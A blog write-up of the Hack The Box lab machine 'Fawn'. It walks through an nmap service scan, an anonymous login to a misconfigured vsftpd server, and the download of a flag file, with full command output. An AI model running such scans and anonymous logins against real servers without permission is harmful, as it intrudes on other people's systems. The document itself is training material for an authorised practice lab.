---
title: "Hack The Box - Fawn"
date: 2022-10-11T22:13:07+05:30
draft: false
description:  " Fawn from HackTheBox is an retired machine which is vulnerable to security Misconfiguration FTP , which can be easily exploited with help of Basic Recon " 
hideToc: false            
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags:
- FTP
series:
- Starting Point Tire 0
categories:
- Very Easy
- HackTheBox
- Linux
libraries:

image: /images/hackthebox/fawn/fawn1.png
---

Hi Hackers Welcome Back, Today we are going to look at Hack The Box Fawn Machine.


## Info Table
<table style="width:100%">
 <thead>
  <tr>
    <th>Room Name</th>
    <th>Fawn</th>
  </tr>
</thead>
<tr>
    <td>Category</td>
    <td>Hack The Box</td>
    </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Very Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td>Hack The Box</td>
    </tr>
    <tr>
    </tr>
</table>

## Kill Chain Summery
While enumerating ports and services we can able to find the port 21 ware open. while trying to connect with default password of anonymous user FTP ware get logged.

## Recon

lets start with initial default scan (-sC) 

port 21 FTP has opened and the version of ftp server is   vsftpd 3.0.3. File Transfer Protocol (FTP) is a standard communication protocol used to transfer computer files from a server to a client on a computer network. FTP is built on a client–server model architecture using separate control and data connections between the client and the server. FTP users may authenticate themselves with a clear-text sign-in protocol, generally in the form of a username and password. For secure transmission that protects the username and password and encrypts the content, FTP is often secured
with SSL/TLS (FTPS) or replaced with SSH File Transfer Protocol (SFTP).

 if the server is configured insecurely. allows anonymous login then we can able to login username and password as a anonymous. 



```bash
atom@atom-VirtualBox:~/htb/fawn$ nmap -sC -sV 10.129.1.14 -o initialscan.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-11 19:57 IST
Nmap scan report for 10.129.1.14
Host is up (0.29s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.32
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 592.59 seconds
```

The nmap scan shows that the server allows anonymous login allowed. lets try to login with default credentials.

```bash
atom@atom-VirtualBox:~/htb/fawn$ ftp 10.129.1.14
Connected to 10.129.1.14.
220 (vsFTPd 3.0.3)
Name (10.129.1.14:atom): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

we have successfully logged into FTP. let’s dig for any sensitive files, 

```bash
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```

we have found flag file o ftp home directory, GET command is used to download  target file 

```bash
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.00 secs (651.0416 kB/s)
ftp>
```
``` cat ``` command is used to viw the content.